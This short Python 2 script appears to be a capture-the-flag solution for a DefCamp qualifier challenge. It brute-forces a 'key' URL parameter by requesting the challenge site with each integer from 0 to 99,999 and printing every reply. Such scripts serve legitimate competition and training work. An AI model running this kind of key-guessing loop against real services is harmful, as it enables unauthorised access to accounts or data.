import urllib

for i in xrange(100000):
    res=urllib.urlopen('https://brave.dctf-quals-17.def.camp/?id=0&key='+str(i))
    print res.read()
